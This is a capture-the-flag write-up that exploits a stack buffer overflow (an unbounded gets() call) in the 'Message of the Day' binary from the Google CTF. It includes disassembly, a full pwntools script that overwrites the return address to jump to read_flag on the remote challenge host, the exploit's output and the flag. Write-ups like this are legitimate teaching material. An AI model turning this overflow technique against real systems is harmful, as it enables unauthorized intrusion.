# Message of the Day
PWN

## Description:
> From the OffHub router, you jump onto the Google-Haus smart hub. This fully feature assistant of the future that uses machine learning on the blockchain to control all our IoT devices promises it all. It delivers the ability to print a Message-of-the-day. The rest is available as a premium subscription service paid monthly.

A binary file was attached.

## Solution:

The service allows us to set and get the "message of the day" for the user. Setting and getting the message for the admin is not allowed:
```console
root@kali:/media/sf_CTFs/google/message/1# nc motd.ctfcompetition.com 1337
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 2
Enter new message of the day
New msg: Test Message
New message of the day saved!
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 1
Test Message
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 3
TODO: Allow admin MOTD to be set
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 4
You're not root!
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 5
```

Let's take a look at the binary:
```
root@kali:/media/sf_CTFs/google/message/1# r2 motd
 -- Quantum dissasemble: it's there as long as you don't observe it
[0x60606060]> aaaa
[WARNING: r_bin_get_vaddr: assertion 'bin && paddr != UT64_MAX' failed (line 1382)
WARNING: r_bin_get_vaddr: assertion 'bin && paddr != UT64_MAX' failed (line 1382)
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
[0x60606060]> afl
0x00400788    3 23           sym._init
0x004007b0    1 6            sym.imp.putchar
0x004007c0    1 6            sym.imp.strncpy
0x004007d0    1 6            sym.imp.strcpy
0x004007e0    1 6            sym.imp.__isoc99_fscanf
0x004007f0    1 6            sym.imp.puts
0x00400800    1 6            sym.imp.getuid
0x00400810    1 6            sym.imp.setbuf
0x00400820    1 6            sym.imp.printf
0x00400830    1 6            sym.imp.gets
0x00400840    1 6            sym.imp.fflush
0x00400850    1 6            sym.imp.fopen
0x00400860    1 6            sym.imp.atoi
0x00400870    1 6            sym.imp.getline
0x60606060    1 43           entry0
0x60606090    4 42   -> 37   sym.deregister_tm_clones
0x606060c0    4 58   -> 55   sym.register_tm_clones
0x60606100    3 34   -> 29   sym.__do_global_dtors_aux
0x60606130    1 7            entry1.init
0x60606137    1 109          sym.set_motd
0x606061a4    1 34           sym.get_motd
0x606061c6    1 19           sym.set_admin_motd
0x606061d9    4 49           sym.get_admin_motd
0x6060620a    1 79           sym.print_menu
0x60606259   14 332  -> 325  sym.main
0x606063a5    1 118          sym.read_flag
0x60606420    3 101  -> 92   sym.__libc_csu_init
0x60606490    1 2            sym.__libc_csu_fini
0x60606494    1 9            sym._fini
```

We'll start from "`set_motd`":
```assembly
[0x60606060]> pdf @ sym.set_motd
/ (fcn) sym.set_motd 109
|   sym.set_motd ();
|           ; var int local_100h @ rbp-0x100
|           ; CALL XREF from sym.main (0x6060636e)
|           0x60606137      55             push rbp
|           0x60606138      4889e5         mov rbp, rsp
|           0x6060613b      4881ec000100.  sub rsp, 0x100
|           0x60606142      488d3d7a0300.  lea rdi, str.Enter_new_message_of_the_day ; 0x606064c3 ; "Enter new message of the day"
|           0x60606149      e8a2a6df9f     call sym.imp.puts           ; int puts(const char *s)
|           0x6060614e      488d3d8b0300.  lea rdi, str.New_msg:       ; 0x606064e0 ; "New msg: "
|           0x60606155      b800000000     mov eax, 0
|           0x6060615a      e8c1a6df9f     call sym.imp.printf         ; int printf(const char *format)
|           0x6060615f      488d8500ffff.  lea rax, [local_100h]
|           0x60606166      4889c7         mov rdi, rax
|           0x60606169      b800000000     mov eax, 0
|           0x6060616e      e8bda6df9f     call sym.imp.gets           ; char *gets(char *s)
|           0x60606173      488d8500ffff.  lea rax, [local_100h]
|           0x6060617a      ba00010000     mov edx, 0x100              ; 256
|           0x6060617f      4889c6         mov rsi, rax
|           0x60606182      488d3d570f20.  lea rdi, obj.MOTD           ; 0x608070e0
|           0x60606189      e832a6df9f     call sym.imp.strncpy        ; char *strncpy(char *dest, const char *src, size_t  n)
|           0x6060618e      c6054a102000.  mov byte [0x608071df], 0    ; [0x608071df:1]=0
|           0x60606195      488d3d4e0300.  lea rdi, str.New_message_of_the_day_saved ; 0x606064ea ; "New message of the day saved!"
|           0x6060619c      e84fa6df9f     call sym.imp.puts           ; int puts(const char *s)
|           0x606061a1      90             nop
|           0x606061a2      c9             leave
\           0x606061a3      c3             ret
```

It looks like input from the user is read via `gets`, but the input size isn't limited. So, we should be able to overflow the 256 local buffer and take over the return address.

Where would we want to jump to? Let's take a look at `read_flag`:
```assembly
[0x60606060]> pdf @ sym.read_flag
/ (fcn) sym.read_flag 118
|   sym.read_flag ();
|           ; var int local_110h @ rbp-0x110
|           ; var int local_8h @ rbp-0x8
|           ; CALL XREF from sym.get_admin_motd (0x60606202)
|           0x606063a5      55             push rbp
|           0x606063a6      4889e5         mov rbp, rsp
|           0x606063a9      4881ec100100.  sub rsp, 0x110
|           0x606063b0      488d95f0feff.  lea rdx, [local_110h]
|           0x606063b7      b800000000     mov eax, 0
|           0x606063bc      b920000000     mov ecx, 0x20               ; 32
|           0x606063c1      4889d7         mov rdi, rdx
|           0x606063c4      f348ab         rep stosq qword [rdi], rax
|           0x606063c7      488d352a0200.  lea rsi, [0x606065f8]       ; "r"
|           0x606063ce      488d3d250200.  lea rdi, str.._flag.txt     ; 0x606065fa ; "./flag.txt"
|           0x606063d5      e876a4df9f     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
|           0x606063da      488945f8       mov qword [local_8h], rax
|           0x606063de      488d95f0feff.  lea rdx, [local_110h]
|           0x606063e5      488b45f8       mov rax, qword [local_8h]
|           0x606063e9      488d35150200.  lea rsi, [0x60606605]       ; "%s"
|           0x606063f0      4889c7         mov rdi, rax
|           0x606063f3      b800000000     mov eax, 0
|           0x606063f8      e8e3a3df9f     call sym.imp.__isoc99_fscanf ; int fscanf(FILE *stream, const char *format, ...)
|           0x606063fd      488d85f0feff.  lea rax, [local_110h]
|           0x60606404      4889c6         mov rsi, rax
|           0x60606407      488d3dfa0100.  lea rdi, str.Admin_MOTD_is:__s ; 0x60606608 ; "Admin MOTD is: %s\n"
|           0x6060640e      b800000000     mov eax, 0
|           0x60606413      e808a4df9f     call sym.imp.printf         ; int printf(const char *format)
|           0x60606418      90             nop
|           0x60606419      c9             leave
\           0x6060641a      c3             ret
```

The function just reads the flag and outputs it, no authentication checks performed. Looks like the checks are done in the calling function:
```assembly
[0x60606060]> pdf @ sym.get_admin_motd
/ (fcn) sym.get_admin_motd 49
|   sym.get_admin_motd ();
|           ; var int local_4h @ rbp-0x4
|           ; CALL XREF from sym.main (0x60606386)
|           0x606061d9      55             push rbp
|           0x606061da      4889e5         mov rbp, rsp
|           0x606061dd      4883ec10       sub rsp, 0x10
|           0x606061e1      e81aa6df9f     call sym.imp.getuid         ; uid_t getuid(void)
|           0x606061e6      8945fc         mov dword [local_4h], eax
|           0x606061e9      837dfc00       cmp dword [local_4h], 0
|       ,=< 0x606061ed      740e           je 0x606061fd
|       |   0x606061ef      488d3d330300.  lea rdi, str.You_re_not_root ; 0x60606529 ; "You're not root!"
|       |   0x606061f6      e8f5a5df9f     call sym.imp.puts           ; int puts(const char *s)
|      ,==< 0x606061fb      eb0b           jmp 0x60606208
|      ||   ; CODE XREF from sym.get_admin_motd (0x606061ed)
|      |`-> 0x606061fd      b800000000     mov eax, 0
|      |    0x60606202      e89e010000     call sym.read_flag
|      |    0x60606207      90             nop
|      |    ; CODE XREF from sym.get_admin_motd (0x606061fb)
|      `--> 0x60606208      c9             leave
\           0x60606209      c3             ret
```

So, we can directly jump to `read_flag` and get the flag.

Python script:
```python
from pwn import *
import os

context(arch='amd64', os='linux', bits = '64')
LOCAL_PATH = "./motd"

def read_menu(proc):
    proc.recvuntil("choice: ")

def get_user_motd(proc):
    read_menu(proc)
    proc.sendline("1")
    proc.recvuntil("MOTD: ")
    out = proc.recvline()
    log.info("Get user MOTD: {}".format(out))
    return out

def set_user_motd(proc, motd):
    log.info("Setting user MOTD: {}".format(motd))
    read_menu(proc)
    proc.sendline("2")
    proc.sendlineafter("New msg: ", motd)

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(LOCAL_PATH)
    set_user_motd(proc, cyclic(300, n = 8))
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = 8)
    log.info("Overflow offset: {}".format(offset))
    return offset


offset = get_overflow_offset()

r = remote("motd.ctfcompetition.com", 1337)
elf = ELF(LOCAL_PATH)
read_flag_address = elf.symbols["read_flag"]
log.info("Address of read_flag: {}".format(hex(read_flag_address)))
set_user_motd(r, fit({offset: read_flag_address}))

print r.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/google/message/1# python exploit.py
[+] Starting local process './motd': pid 1028
[*] Setting user MOTD: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
[*] Process './motd' stopped with exit code -11 (SIGSEGV) (pid 1028)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/google/message/1/core.1028'
    Arch:      amd64-64-little
    RIP:       0x606061a3
    RSP:       0x7ffd8f98a1e8
    Exe:       '/media/sf_CTFs/google/message/1/motd' (0x60606000)
    Fault:     0x6261616161616169
[*] Overflow offset: 264
[+] Opening connection to motd.ctfcompetition.com on port 1337: Done
[*] '/media/sf_CTFs/google/message/1/motd'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Address of read_flag: 0x606063a5
[*] Setting user MOTD: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaac\xa5c``\x00\x00\x00\x00
[+] Receiving all data: Done (74B)
[*] Closed connection to motd.ctfcompetition.com port 1337
New message of the day saved!
Admin MOTD is: CTF{m07d_1s_r3t_2_r34d_fl4g}
```

The flag: CTF{m07d_1s_r3t_2_r34d_fl4g}